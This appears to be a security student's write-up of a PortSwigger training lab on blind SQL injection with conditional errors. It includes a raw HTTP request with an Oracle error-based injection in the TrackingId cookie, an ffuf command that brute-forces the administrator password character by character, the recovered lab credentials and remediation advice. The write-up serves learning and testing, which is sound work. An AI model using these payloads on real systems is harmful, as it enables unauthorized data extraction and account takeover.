# Blind SQL injection with conditional errors - PortSwigger Lab 35

**Severity:** Medium
**Target:** https://0a18005e04816c368003080600b70047.web-security-academy.net

## Summary
The application concatenates the user input directly into the query and interpreted as SQL.


## Vulnerability Details
**Type:** Blind SQL injection
**Root Cause:** Lack of input sanitization/validation on the Oracle DB, the vector is created via concatenation in the cookie using Oracle syntax. ``||``
**Endpoint:**  /

## Steps to Reproduce
1. Create a wordlist from a-z, 0-9 & A-Z; called testefuz.txt
2. Try different types of database syntax until you identify Oracle.
3. Create a req.txt file to allocate the cookie header using the SQLi
4. After that, run ffuf attack-line with -mc 500 to filter TRUE.
5. Perform position by position until position 21 returns false.

## Proof of Concept

req.txt
```bash
GET / HTTP/1.1
Host: 0a18005e04816c368003080600b70047.web-security-academy.net
Cookie: TrackingId=XOqI8SzaKowydEzs'||(SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'FUZZ') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')||'; session=eYt28e3KeMSlCvzIeu3m4mkqxuapQagh
```

ffuf attackline
```bash
ffuf -w /home/luweed/Documents/testefuz.txt:FUZZ \
     -request /home/luweed/Documents/req.txt \
     -request-proto https \
     -mc 500
```

final req.txt (false)
```bash
GET / HTTP/1.1
Host: 0a18005e04816c368003080600b70047.web-security-academy.net
Cookie: TrackingId=XOqI8SzaKowydEzs'||(SELECT CASE WHEN (SUBSTR(password, 21, 1) = 'FUZZ') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')||'; session=eYt28e3KeMSlCvzIeu3m4mkqxuapQagh
```


## Result

<br>
<img width="1920" height="987" alt="Screenshot From 2026-04-29 11-00-31" src="https://github.com/user-attachments/assets/c802210a-42d7-4810-9c17-0259ec70c0f8" />

<br>
<br>
<img width="1920" height="920" alt="Screenshot From 2026-04-29 11-05-41" src="https://github.com/user-attachments/assets/f85b1dd4-1c1c-40a4-9260-6a455db554b0" />


<br>
<br>

user: administrator password:b26xmd3fbxjwuwm3rg5g


## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
Use parameterized queries (prepared statements) to prevent user input from being interpreted as SQL. 
Avoid reflecting query results in application behavior in ways that enable boolean-based inference.
